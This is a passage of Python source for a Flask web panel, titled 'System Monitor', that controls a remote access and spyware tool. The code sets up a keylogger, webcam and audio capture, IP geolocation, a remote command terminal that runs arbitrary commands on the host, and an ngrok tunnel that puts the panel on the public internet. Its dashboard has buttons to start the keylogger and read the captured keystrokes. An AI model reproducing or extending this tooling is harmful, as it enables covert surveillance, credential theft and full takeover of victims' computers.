        elif system_name == "darwin":  # macOS
            return self._try_macos_specific(message, sender)
        elif system_name == "linux":
            return self._try_linux_specific(message, sender)
        
        return False
    
    def _try_windows_specific(self, message, sender):
        """Windows-specific notification methods"""
        try:
            # Method: Use ctypes for simple message box
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, message, f"💬 {sender}", 0x40 | 0x1000)
            print("✅ Used ctypes messagebox")
            return True
        except Exception as e:
            print(f"❌ ctypes messagebox failed: {e}")
        
        return False
    
    def _try_macos_specific(self, message, sender):
        """macOS-specific notification methods"""
        try:
            script = f'display notification "{message}" with title "💬 {sender}" sound name "Glass"'
            subprocess.run(['osascript', '-e', script], check=True)
            print("✅ Used macOS notification")
            return True
        except Exception as e:
            print(f"❌ macOS notification failed: {e}")
            return False
    
    def _try_linux_specific(self, message, sender):
        """Linux-specific notification methods"""
        try:
            # Try notify-send
            subprocess.run(['notify-send', f'💬 {sender}', message], check=True)
            print("✅ Used Linux notify-send")
            return True
        except Exception as e:
            print(f"❌ Linux notify-send failed: {e}")
            
        try:
            # Try zenity
            subprocess.run(['zenity', '--info', '--text', message, '--title', f'💬 {sender}'], 
                         check=True)
            print("✅ Used Linux zenity")
            return True
        except Exception as e:
            print(f"❌ Linux zenity failed: {e}")
            
        return False
    
    def _ultimate_fallback(self, message, sender):
        """Ultimate fallback - always works"""
        try:
            # Create a simple HTML file and open it in browser
            html_content = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>💬 {sender}</title>
                <style>
                    body {{
                        font-family: Arial, sans-serif;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        margin: 0;
                        padding: 20px;
                        color: white;
                        text-align: center;
                        height: 100vh;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                    }}
                    .notification {{
                        background: rgba(255,255,255,0.1);
                        backdrop-filter: blur(10px);
                        border-radius: 15px;
                        padding: 30px;
                        max-width: 400px;
                        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                        border: 1px solid rgba(255,255,255,0.2);
                    }}
                    .sender {{
                        font-size: 24px;
                        font-weight: bold;
                        margin-bottom: 15px;
                        color: #ffd700;
                    }}
                    .message {{
                        font-size: 18px;
                        line-height: 1.5;
                        margin-bottom: 20px;
                    }}
                    .time {{
                        font-size: 12px;
                        color: #ccc;
                    }}
                </style>
                <script>
                    // Auto-close after 5 seconds
                    setTimeout(function() {{
                        window.close();
                    }}, 5000);
                    
                    // Also allow clicking to close
                    document.addEventListener('click', function() {{
                        window.close();
                    }});
                </script>
            </head>
            <body>
                <div class="notification">
                    <div class="sender">💬 {sender}</div>
                    <div class="message">{message}</div>
                    <div class="time">Click anywhere or wait 5 seconds to close...</div>
                </div>
            </body>
            </html>
            """
            
            # Save HTML to temporary file
            temp_file = "temp_notification.html"
            with open(temp_file, "w", encoding="utf-8") as f:
                f.write(html_content)
            
            # Open in browser
            webbrowser.open(f"file://{os.path.abspath(temp_file)}")
            
            # Schedule file deletion
            threading.Timer(10, lambda: os.remove(temp_file) if os.path.exists(temp_file) else None).start()
            
            print("✅ Used browser fallback notification")
            return True
            
        except Exception as e:
            print(f"❌ Browser fallback failed: {e}")
            # Final console fallback
            self._console_notification(message, sender)
            return False
    
    def _console_notification(self, message, sender):
        """Console-based notification as last resort"""
        print("\n" + "="*60)
        print("🎉 NEW MESSAGE RECEIVED 🎉")
        print("="*60)
        print(f"From: {sender}")
        print(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Message: {message}")
        print("="*60)
        
        # Try to make a sound
        try:
            import winsound
            winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
            # Beep sequence for attention
            for i in range(3):
                winsound.Beep(1000, 200)
                time.sleep(0.1)
        except:
            # Console beep as fallback
            print('\a\a\a')  # System beep

# Initialize managers
camera_manager = CameraManager()
audio_manager = AudioManager()
ngrok_manager = NgrokManager(port=PORT)
system_monitor = SystemMonitor()
popup_manager = UniversalPopupManager()
command_manager = CommandManager()
geo_tracker = GeolocationTracker()
key_logger = KeyLogger()

# Initialize mailer
try:
    mailer = SecureJetsuMailer()
    # Test email configuration
    if not mailer.test_connection():
        print("❌ Email configuration test failed. Please check your credentials.")
        sys.exit(1)
except Exception as e:
    print(f"❌ Failed to initialize email system: {e}")
    sys.exit(1)

def get_local_ip():
    """Get local IP address for network access"""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except:
        return "127.0.0.1"

def audio_capture_loop():
    """Continuous audio capture loop"""
    while True:
        try:
            if audio_manager.recording:
                audio_data = audio_manager.read_audio()
                if audio_data:
                    audio_buffer.append(audio_data)
            time.sleep(CHUNK / RATE)
        except Exception as e:
            time.sleep(1)

def cleanup_resources():
    """Cleanup all resources on exit"""
    print("\n🛑 Cleaning up resources...")
    audio_manager.cleanup()
    ngrok_manager.stop_ngrok()
    popup_manager.stop()
    key_logger.stop_logging()  # Stop keylogger on exit
    print("✅ Cleanup completed")

# Register cleanup function
atexit.register(cleanup_resources)

def show_popup_notification(message, sender="Anonymous"):
    """Show popup notification on host computer"""
    try:
        popup_queue.put({
            'message': message,
            'sender': sender
        })
        print(f"📨 Message queued: '{message}' from {sender}")
        return True
    except Exception as e:
        print(f"❌ Failed to queue popup: {e}")
        return False

@app.route('/')
def index():
    """Main page with clean modern design"""
    local_ip = get_local_ip()
    ngrok_status = "Active" if ngrok_manager.public_url else "Inactive"
    
    html = f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>System Monitor</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
        <style>
            :root {{
                --primary: #6366f1;
                --primary-dark: #4f46e5;
                --secondary: #10b981;
                --danger: #ef4444;
                --warning: #f59e0b;
                --info: #3b82f6;
                --dark: #1f2937;
                --darker: #111827;
                --light: #f8fafc;
                --gray: #6b7280;
                --card-bg: rgba(255, 255, 255, 0.05);
                --border: rgba(255, 255, 255, 0.1);
            }}

            * {{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }}

            body {{
                font-family: 'Inter', sans-serif;
                background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
                color: var(--light);
                min-height: 100vh;
                line-height: 1.6;
            }}

            .container {{
                max-width: 1400px;
                margin: 0 auto;
                padding: 20px;
            }}

            /* Header Styles */
            .header {{
                text-align: center;
                margin-bottom: 40px;
                padding: 40px 20px;
            }}

            .logo {{
                font-size: 3rem;
                margin-bottom: 16px;
            }}

            .header h1 {{
                font-size: 2.5rem;
                font-weight: 700;
                background: linear-gradient(135deg, var(--primary), var(--secondary));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin-bottom: 12px;
            }}

            .header p {{
                font-size: 1.1rem;
                color: var(--gray);
                max-width: 600px;
                margin: 0 auto;
            }}

            /* Grid Layout */
            .grid {{
                display: grid;
                grid-template-columns: 1fr 1fr;
                gap: 24px;
                margin-bottom: 24px;
            }}

            @media (max-width: 1200px) {{
                .grid {{
                    grid-template-columns: 1fr;
                }}
            }}

            /* Network Info */
            .network-info {{
                background: var(--card-bg);
                backdrop-filter: blur(20px);
                border: 1px solid var(--border);
                border-radius: 20px;
                padding: 24px;
                margin-bottom: 24px;
            }}

            .network-info h3 {{
                font-size: 1.2rem;
                margin-bottom: 16px;
                color: var(--light);
                display: flex;
                align-items: center;
                gap: 8px;
            }}

            .url-grid {{
                display: grid;
                grid-template-columns: 1fr;
                gap: 12px;
                margin: 20px 0;
            }}

            .url-item {{
                background: rgba(0, 0, 0, 0.3);
                padding: 16px;
                border-radius: 12px;
                border: 1px solid var(--border);
            }}

            .url-label {{
                font-size: 0.9rem;
                color: var(--gray);
                margin-bottom: 4px;
                display: flex;
                align-items: center;
                gap: 6px;
            }}

            .url-value {{
                font-family: 'Monaco', 'Consolas', monospace;
                font-size: 0.95rem;
                color: var(--light);
                word-break: break-all;
                margin-top: 8px;
            }}

            .copy-btn {{
                background: var(--primary);
                color: white;
                border: none;
                padding: 4px 8px;
                border-radius: 4px;
                font-size: 0.8rem;
                cursor: pointer;
                margin-left: 8px;
            }}

            .copy-btn:hover {{
                background: var(--primary-dark);
            }}

            .status-badge {{
                padding: 4px 8px;
                border-radius: 12px;
                font-size: 0.8rem;
                font-weight: 600;
                margin-left: 8px;
            }}

            .status-active {{
                background: var(--secondary);
                color: white;
            }}

            .status-inactive {{
                background: var(--gray);
                color: white;
            }}

            /* Card Styles */
            .card {{
                background: var(--card-bg);
                backdrop-filter: blur(20px);
                border: 1px solid var(--border);
                border-radius: 20px;
                padding: 30px;
                margin-bottom: 24px;
                transition: transform 0.2s ease, border-color 0.2s ease;
            }}

            .card:hover {{
                border-color: rgba(99, 102, 241, 0.3);
                transform: translateY(-2px);
            }}

            .card-header {{
                display: flex;
                align-items: center;
                justify-content: space-between;
                margin-bottom: 24px;
            }}

            .card-title {{
                font-size: 1.3rem;
                font-weight: 600;
                color: var(--light);
                display: flex;
                align-items: center;
                gap: 10px;
            }}

            .card-icon {{
                width: 32px;
                height: 32px;
                background: linear-gradient(135deg, var(--primary), var(--secondary));
                border-radius: 8px;
                display: flex;
                align-items: center;
                justify-content: center;
                font-size: 1rem;
            }}

            /* Camera Feed */
            .camera-feed {{
                width: 100%;
                height: 400px;
                background: var(--darker);
                border-radius: 12px;
                overflow: hidden;
                border: 1px solid var(--border);
                display: flex;
                align-items: center;
                justify-content: center;
                color: var(--gray);
            }}

            .camera-feed img {{
                width: 100%;
                height: 100%;
                object-fit: cover;
            }}

            /* Controls */
            .controls {{
                display: flex;
                gap: 12px;
                margin-top: 16px;
                flex-wrap: wrap;
            }}

            .btn {{
                padding: 12px 24px;
                border: none;
                border-radius: 12px;
                font-weight: 500;
                font-size: 0.9rem;
                cursor: pointer;
                transition: all 0.2s ease;
                display: flex;
                align-items: center;
                gap: 8px;
                text-decoration: none;
            }}

            .btn-primary {{
                background: var(--primary);
                color: white;
            }}

            .btn-primary:hover {{
                background: var(--primary-dark);
                transform: translateY(-1px);
            }}

            .btn-secondary {{
                background: rgba(255, 255, 255, 0.1);
                color: var(--light);
                border: 1px solid var(--border);
            }}

            .btn-secondary:hover {{
                background: rgba(255, 255, 255, 0.2);
            }}

            .btn-danger {{
                background: var(--danger);
                color: white;
            }}

            .btn-danger:hover {{
                background: #dc2626;
            }}

            .btn-success {{
                background: var(--secondary);
                color: white;
            }}

            .btn-success:hover {{
                background: #0da271;
            }}

            .btn-warning {{
                background: var(--warning);
                color: white;
            }}

            .btn-warning:hover {{
                background: #d97706;
            }}

            /* System Stats */
            .stats-grid {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 16px;
                margin-bottom: 24px;
            }}

            .stat-card {{
                background: rgba(0, 0, 0, 0.3);
                padding: 20px;
                border-radius: 12px;
                border: 1px solid var(--border);
                text-align: center;
            }}

            .stat-value {{
                font-size: 1.8rem;
                font-weight: 700;
                margin-bottom: 8px;
            }}

            .stat-label {{
                font-size: 0.9rem;
                color: var(--gray);
            }}

            .stat-cpu {{
                color: var(--info);
            }}

            .stat-memory {{
                color: var(--warning);
            }}

            .stat-disk {{
                color: var(--secondary);
            }}

            .stat-network {{
                color: var(--primary);
            }}

            /* Progress Bars */
            .progress-container {{
                margin: 20px 0;
            }}

            .progress-label {{
                display: flex;
                justify-content: space-between;
                margin-bottom: 8px;
                font-size: 0.9rem;
            }}

            .progress-bar {{
                height: 8px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 4px;
                overflow: hidden;
            }}

            .progress-fill {{
                height: 100%;
                border-radius: 4px;
                transition: width 0.3s ease;
            }}

            .progress-cpu {{
                background: var(--info);
            }}

            .progress-memory {{
                background: var(--warning);
            }}

            .progress-disk {{
                background: var(--secondary);
            }}

            /* Process List */
            .process-list {{
                max-height: 400px;
                overflow-y: auto;
            }}

            .process-item {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                padding: 12px 0;
                border-bottom: 1px solid var(--border);
            }}

            .process-name {{
                font-weight: 500;
                flex: 2;
            }}

            .process-pid {{
                color: var(--gray);
                flex: 1;
            }}

            .process-cpu, .process-memory {{
                flex: 1;
                text-align: right;
            }}

            /* Chat Styles */
            .chat-container {{
                display: flex;
                flex-direction: column;
                height: 500px;
            }}

            .chat-messages {{
                flex: 1;
                overflow-y: auto;
                padding: 16px;
                background: rgba(0, 0, 0, 0.3);
                border-radius: 12px;
                margin-bottom: 16px;
                border: 1px solid var(--border);
            }}

            .message {{
                margin-bottom: 16px;
                padding: 12px 16px;
                border-radius: 12px;
                max-width: 80%;
            }}

            .message-remote {{
                background: var(--primary);
                color: white;
                margin-right: auto;
            }}

            .message-local {{
                background: rgba(255, 255, 255, 0.1);
                margin-left: auto;
            }}

            .message-sender {{
                font-weight: 600;
                font-size: 0.8rem;
                margin-bottom: 4px;
                opacity: 0.8;
            }}

            .message-content {{
                font-size: 0.9rem;
            }}

            .chat-input {{
                display: flex;
                gap: 12px;
            }}

            .chat-input input {{
                flex: 1;
                padding: 12px 16px;
                border: 1px solid var(--border);
                border-radius: 12px;
                background: rgba(255, 255, 255, 0.05);
                color: var(--light);
                font-size: 0.9rem;
            }}

            .chat-input input:focus {{
                outline: none;
                border-color: var(--primary);
            }}

            /* Command Terminal */
            .terminal {{
                background: var(--darker);
                border: 1px solid var(--border);
                border-radius: 12px;
                padding: 20px;
                font-family: 'Monaco', 'Consolas', monospace;
                font-size: 0.9rem;
                height: 400px;
                overflow-y: auto;
                margin-bottom: 16px;
            }}

            .terminal-line {{
                margin-bottom: 8px;
                line-height: 1.4;
            }}

            .terminal-prompt {{
                color: var(--secondary);
                font-weight: bold;
            }}

            .terminal-command {{
                color: var(--light);
            }}

            .terminal-output {{
                color: var(--gray);
                white-space: pre-wrap;
                margin-top: 4px;
            }}

            .terminal-error {{
                color: var(--danger);
            }}

            .command-input {{
                display: flex;
                gap: 12px;
            }}

            .command-input input {{
                flex: 1;
                padding: 12px 16px;
                border: 1px solid var(--border);
                border-radius: 12px;
                background: rgba(255, 255, 255, 0.05);
                color: var(--light);
                font-family: 'Monaco', 'Consolas', monospace;
                font-size: 0.9rem;
            }}

            .command-input input:focus {{
                outline: none;
                border-color: var(--primary);
            }}

            /* Responsive */
            @media (max-width: 768px) {{
                .container {{
                    padding: 16px;
                }}

                .header {{
                    padding: 20px 16px;
                }}

                .header h1 {{
                    font-size: 2rem;
                }}

                .card {{
                    padding: 20px;
                }}

                .controls {{
                    flex-direction: column;
                }}

                .btn {{
                    justify-content: center;
                }}
            }}
        </style>
    </head>
    <body>
        <div class="container">
            <!-- Header -->
            <div class="header">
                <div class="logo">🔒</div>
                <h1>System Monitor</h1>
                <p>Real-time monitoring and remote access interface</p>
            </div>

            <!-- Network Information -->
            <div class="network-info">
                <h3>🌐 Network Access</h3>
                <div class="url-grid">
                    <div class="url-item">
                        <div class="url-label">
                            <span>Local Network</span>
                            <span class="status-badge status-active">Active</span>
                        </div>
                        <div class="url-value">http://{local_ip}:{PORT}</div>
                    </div>
                    <div class="url-item">
                        <div class="url-label">
                            <span>Public Access (Ngrok)</span>
                            <span class="status-badge status-{ngrok_status.lower()}">{ngrok_status}</span>
                        </div>
                        <div class="url-value">{ngrok_manager.public_url or "Not available"}</div>
                    </div>
                </div>
                <div class="controls">
                    <button class="btn btn-primary" onclick="copyToClipboard('http://{local_ip}:{PORT}')">
                        📋 Copy Local URL
                    </button>
                    <button class="btn btn-secondary" onclick="copyToClipboard('{ngrok_manager.public_url or ''}')" {'' if ngrok_manager.public_url else 'disabled'}>
                        🌐 Copy Public URL
                    </button>
                </div>
            </div>

            <!-- Main Grid -->
            <div class="grid">
                <!-- Left Column -->
                <div>
                    <!-- Camera Feed -->
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <div class="card-icon">📷</div>
                                Camera Feed
                            </div>
                        </div>
                        <div class="camera-feed">
                            <img src="/video_feed" alt="Camera Feed" id="camera-feed">
                        </div>
                        <div class="controls">
                            <button class="btn btn-primary" onclick="startCamera()">
                                ▶️ Start Camera
                            </button>
                            <button class="btn btn-secondary" onclick="stopCamera()">
                                ⏹️ Stop Camera
                            </button>
                        </div>
                    </div>

                    <!-- Geolocation Tracker -->
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <div class="card-icon">🗺️</div>
                                Geolocation Tracker
                            </div>
                            <button class="btn btn-secondary" onclick="refreshLocation()">
                                🔄 Refresh
                            </button>
                        </div>
                        <div id="location-info">
                            <div style="text-align: center; color: var(--gray);">
                                Click refresh to get location data
                            </div>
                        </div>
                        <div class="controls">
                            <button class="btn btn-primary" onclick="openMap()">
                                🗺️ Open in Maps
                            </button>
                        </div>
                    </div>

                    <!-- System Information -->
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <div class="card-icon">💻</div>
                                System Information
                            </div>
                            <button class="btn btn-secondary" onclick="refreshSystemInfo()">
                                🔄 Refresh
                            </button>
                        </div>
                        <div id="system-info">
                            <div style="text-align: center; color: var(--gray);">
                                Loading system information...
                            </div>
                        </div>
                    </div>
                </div>

                <!-- Right Column -->
                <div>
                    <!-- Command Terminal -->
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <div class="card-icon">💻</div>
                                Command Terminal
                            </div>
                            <button class="btn btn-secondary" onclick="clearTerminal()">
                                🗑️ Clear
                            </button>
                        </div>
                        <div class="terminal" id="terminal-output">
                            <div class="terminal-line">
                                <span class="terminal-prompt">$</span>
                                <span class="terminal-command">Welcome to remote command terminal</span>
                            </div>
                            <div class="terminal-line">
                                <span class="terminal-prompt">$</span>
                                <span class="terminal-command">Current directory: <span id="current-dir">{command_manager.get_current_directory()}</span></span>
                            </div>
                        </div>
                        <div class="command-input">
                            <input type="text" id="command-input" placeholder="Enter command (e.g., dir, ls, ipconfig, ping...)">
                            <button class="btn btn-primary" onclick="executeCommand()">
                                ⚡ Execute
                            </button>
                        </div>
                    </div>

                    <!-- Keylogger -->
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <div class="card-icon">⌨️</div>
                                Keylogger
                                <span id="keylogger-status" class="status-badge status-inactive">Stopped</span>
                            </div>
                        </div>
                        <div class="controls">
                            <button class="btn btn-success" onclick="startKeylogger()" id="start-keylogger-btn">
                                ▶️ Start Keylogger
                            </button>
                            <button class="btn btn-danger" onclick="stopKeylogger()" id="stop-keylogger-btn">
                                ⏹️ Stop Keylogger
                            </button>
                            <button class="btn btn-secondary" onclick="refreshKeylogs()">
                                📋 Refresh Logs
                            </button>
                            <button class="btn btn-warning" onclick="clearKeylogs()">
                                🗑️ Clear Logs
                            </button>
                        </div>
                        <div class="terminal" id="keylog-output" style="height: 300px; margin-top: 16px;">
                            <div style="color: var(--gray); text-align: center; padding: 20px;">
                                Keylogger data will appear here
                            </div>
                        </div>
                    </div>

                    <!-- Chat Interface -->
                    <div class="card">
                        <div class="card-header">
                            <div class="card-title">
                                <div class="card-icon">💬</div>
                                Remote Chat
                            </div>
                        </div>
                        <div class="chat-container">
                            <div class="chat-messages" id="chat-messages">
                                <div class="message message-local">
                                    <div class="message-sender">System</div>
                                    <div class="message-content">Chat session started. Send messages to the host computer.</div>
                                </div>
                            </div>
                            <div class="chat-input">
                                <input type="text" id="chat-input" placeholder="Type a message to show on host computer...">
                                <button class="btn btn-primary" onclick="sendMessage()">
                                    📨 Send
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Processes -->
            <div class="card">
                <div class="card-header">
                    <div class="card-title">
                        <div class="card-icon">⚙️</div>
                        Running Processes
                    </div>
                    <button class="btn btn-secondary" onclick="refreshProcesses()">
                        🔄 Refresh
                    </button>
                </div>
                <div id="process-list">
                    <div style="text-align: center; color: var(--gray);">
                        Loading processes...
                    </div>
                </div>
            </div>
        </div>

        <script>
            // Copy to clipboard function
            function copyToClipboard(text) {{
                if (!text) return;
                navigator.clipboard.writeText(text).then(function() {{
                    alert('URL copied to clipboard!');
                }});
            }}

            // Camera controls
            function startCamera() {{
                fetch('/start_camera', {{ method: 'POST' }})
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            alert('Camera started successfully');
                        }} else {{
                            alert('Failed to start camera: ' + data.error);
                        }}
                    }});
            }}

            function stopCamera() {{
                fetch('/stop_camera', {{ method: 'POST' }})
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            alert('Camera stopped successfully');
                            document.getElementById('camera-feed').src = '';
                        }} else {{
                            alert('Failed to stop camera');
                        }}
                    }});
            }}

            // System info auto-refresh
            function refreshSystemInfo() {{
                fetch('/system_info')
                    .then(response => response.json())
                    .then(data => {{
                        displaySystemInfo(data);
                    }});
            }}

            function displaySystemInfo(info) {{
                if (!info.cpu_percent) {{
                    document.getElementById('system-info').innerHTML = 
                        '<div style="text-align: center; color: var(--danger);">Failed to load system information</div>';
                    return;
                }}

                const html = `
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-value stat-cpu">${{info.cpu_percent}}%</div>
                            <div class="stat-label">CPU Usage</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value stat-memory">${{info.memory_percent}}%</div>
                            <div class="stat-label">Memory Usage</div>
                            <div style="font-size: 0.8rem; color: var(--gray);">
                                ${{info.memory_used}}GB / ${{info.memory_total}}GB
                            </div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value stat-disk">${{info.disk_percent}}%</div>
                            <div class="stat-label">Disk Usage</div>
                            <div style="font-size: 0.8rem; color: var(--gray);">
                                ${{info.disk_used}}GB / ${{info.disk_total}}GB
                            </div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value stat-network">${{info.network_recv}}MB</div>
                            <div class="stat-label">Network Received</div>
                            <div style="font-size: 0.8rem; color: var(--gray);">
                                Sent: ${{info.network_sent}}MB
                            </div>
                        </div>
                    </div>
                    <div class="progress-container">
                        <div class="progress-label">
                            <span>CPU</span>
                            <span>${{info.cpu_percent}}%</span>
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill progress-cpu" style="width: ${{info.cpu_percent}}%"></div>
                        </div>
                    </div>
                    <div class="progress-container">
                        <div class="progress-label">
                            <span>Memory</span>
                            <span>${{info.memory_percent}}%</span>
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill progress-memory" style="width: ${{info.memory_percent}}%"></div>
                        </div>
                    </div>
                    <div class="progress-container">
                        <div class="progress-label">
                            <span>Disk</span>
                            <span>${{info.disk_percent}}%</span>
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill progress-disk" style="width: ${{info.disk_percent}}%"></div>
                        </div>
                    </div>
                    ${{info.battery_percent ? `
                    <div class="progress-container">
                        <div class="progress-label">
                            <span>Battery</span>
                            <span>${{info.battery_percent}}% ${{info.battery_plugged ? '(Charging)' : ''}}</span>
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill progress-disk" style="width: ${{info.battery_percent}}%"></div>
                        </div>
                    </div>
                    ` : ''}}
                    <div style="text-align: center; color: var(--gray); margin-top: 16px;">
                        Last updated: ${{info.timestamp}}
                    </div>
                `;
                document.getElementById('system-info').innerHTML = html;
            }}

            // Processes
            function refreshProcesses() {{
                fetch('/processes')
                    .then(response => response.json())
                    .then(data => {{
                        displayProcesses(data);
                    }});
            }}

            function displayProcesses(processes) {{
                if (!processes || processes.length === 0) {{
                    document.getElementById('process-list').innerHTML = 
                        '<div style="text-align: center; color: var(--danger);">No processes found</div>';
                    return;
                }}

                let html = '<div class="process-list">';
                processes.forEach(process => {{
                    html += `
                        <div class="process-item">
                            <div class="process-name">${{process.name}}</div>
                            <div class="process-pid">PID: ${{process.pid}}</div>
                            <div class="process-cpu">${{process.cpu}}%</div>
                            <div class="process-memory">${{process.memory}}%</div>
                        </div>
                    `;
                }});
                html += '</div>';
                document.getElementById('process-list').innerHTML = html;
            }}

            // Chat functionality
            function sendMessage() {{
                const input = document.getElementById('chat-input');
                const message = input.value.trim();
                
                if (!message) return;

                // Add to chat
                addChatMessage('You', message, 'local');
                input.value = '';

                // Send to server
                fetch('/send_message', {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json',
                    }},
                    body: JSON.stringify({{
                        message: message,
                        sender: 'Anonymous'
                    }})
                }}).then(response => response.json())
                  .then(data => {{
                      if (!data.success) {{
                          addChatMessage('System', 'Failed to send message', 'local');
                      }}
                  }});
            }}

            function addChatMessage(sender, content, type) {{
                const messagesDiv = document.getElementById('chat-messages');
                const messageDiv = document.createElement('div');
                messageDiv.className = `message message-${{type}}`;
                messageDiv.innerHTML = `
                    <div class="message-sender">${{sender}}</div>
                    <div class="message-content">${{content}}</div>
                `;
                messagesDiv.appendChild(messageDiv);
                messagesDiv.scrollTop = messagesDiv.scrollHeight;
            }}

            // Command terminal functionality
            function executeCommand() {{
                const input = document.getElementById('command-input');
                const command = input.value.trim();
                
                if (!command) return;

                // Add command to terminal
                addTerminalLine('command', command);
                input.value = '';

                // Execute command
                fetch('/execute_command', {{
                    method: 'POST',
                    headers: {{
                        'Content-Type': 'application/json',
                    }},
                    body: JSON.stringify({{
                        command: command
                    }})
                }}).then(response => response.json())
                  .then(data => {{
                      if (data.success) {{
                          addTerminalLine('output', data.output);
                          // Update current directory if changed
                          if (data.current_directory) {{
                              document.getElementById('current-dir').textContent = data.current_directory;
                          }}
                      }} else {{
                          addTerminalLine('error', data.error);
                      }}
                  }});
            }}

            function addTerminalLine(type, content) {{
                const terminal = document.getElementById('terminal-output');
                const line = document.createElement('div');
                line.className = 'terminal-line';
                
                if (type === 'command') {{
                    line.innerHTML = `
                        <span class="terminal-prompt">$</span>
                        <span class="terminal-command">${{content}}</span>
                    `;
                }} else if (type === 'output') {{
                    line.innerHTML = `
                        <div class="terminal-output">${{content}}</div>
                    `;
                }} else if (type === 'error') {{
                    line.innerHTML = `
                        <div class="terminal-output terminal-error">${{content}}</div>
                    `;
                }}
                
                terminal.appendChild(line);
                terminal.scrollTop = terminal.scrollHeight;
            }}

            function clearTerminal() {{
                document.getElementById('terminal-output').innerHTML = `
                    <div class="terminal-line">
                        <span class="terminal-prompt">$</span>
                        <span class="terminal-command">Terminal cleared</span>
                    </div>
                `;
            }}

            // Geolocation functions
            function refreshLocation() {{
                fetch('/geolocation')
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            displayLocationInfo(data.location);
                        }} else {{
                            document.getElementById('location-info').innerHTML = 
                                '<div style="text-align: center; color: var(--danger);">Failed to get location</div>';
                        }}
                    }});
            }}

            function displayLocationInfo(location) {{
                const html = `
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-value stat-network">${{location.ip_address}}</div>
                            <div class="stat-label">IP Address</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value stat-cpu">${{location.city}}</div>
                            <div class="stat-label">City</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value stat-memory">${{location.region}}</div>
                            <div class="stat-label">Region</div>
                        </div>
                        <div class="stat-card">
                            <div class="stat-value stat-disk">${{location.country}}</div>
                            <div class="stat-label">Country</div>
                        </div>
                    </div>
                    <div style="margin: 16px 0;">
                        <strong>Coordinates:</strong> ${{location.latitude}}, ${{location.longitude}}<br>
                        <strong>ISP:</strong> ${{location.isp}}<br>
                        <strong>Timezone:</strong> ${{location.timezone}}<br>
                        <strong>Last Updated:</strong> ${{location.timestamp}}
                    </div>
                `;
                document.getElementById('location-info').innerHTML = html;
            }}

            function openMap() {{
                fetch('/location_map')
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            window.open(data.map_url, '_blank');
                        }} else {{
                            alert('No location data available');
                        }}
                    }});
            }}

            // Keylogger functions
            function startKeylogger() {{
                fetch('/start_keylogger', {{ method: 'POST' }})
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            document.getElementById('keylogger-status').textContent = 'Running';
                            document.getElementById('keylogger-status').className = 'status-badge status-active';
                            alert('Keylogger started successfully');
                            refreshKeylogs();
                        }} else {{
                            alert('Failed to start keylogger: ' + data.error);
                        }}
                    }});
            }}

            function stopKeylogger() {{
                fetch('/stop_keylogger', {{ method: 'POST' }})
                    .then(response => response.json())
                    .then(data => {{
                        if (data.success) {{
                            document.getElementById('keylogger-status').textContent = 'Stopped';
                            document.getElementById('keylogger-status').className = 'status-badge status-inactive';
                            alert('Keylogger stopped successfully');
                            refreshKeylogs();
                        }} else {{
                            alert('Failed to stop keylogger: ' + data.error);
                        }}
                    }});
            }}

            function refreshKeylogs() {{
                fetch('/keylog_data')
                    .then(response => response.json())
                    .then(data => {{
                        const output = document.getElementById('keylog-output');
                        if (data.success) {{
                            output.innerHTML = `<div style="white-space: pre-wrap; font-family: 'Monaco', 'Consolas', monospace; padding: 10px;">${{data.logs || 'No keystrokes recorded yet'}}</div>`;
                            output.scrollTop = output.scrollHeight;
                            
                            // Update status
                            if (data.status) {{
                                const statusText = data.status.is_running ? 'Running' : 'Stopped';
                                const statusClass = data.status.is_running ? 'status-active' : 'status-inactive';
                                document.getElementById('keylogger-status').textContent = statusText;
                                document.getElementById('keylogger-status').className = 'status-badge ' + statusClass;
                            }}
                        }} else {{
                            output.innerHTML = `<div style="color: var(--danger);">Error: ${{data.error}}</div>`;
                        }}
                    }});
            }}

            function clearKeylogs() {{
                if (confirm('Are you sure you want to clear all keylogs?')) {{
                    fetch('/clear_keylogs', {{ method: 'POST' }})
                        .then(response => response.json())
                        .then(data => {{
                            if (data.success) {{
                                alert('Keylogs cleared successfully');
                                refreshKeylogs();
                            }} else {{
                                alert('Failed to clear keylogs: ' + data.error);
                            }}
                        }});
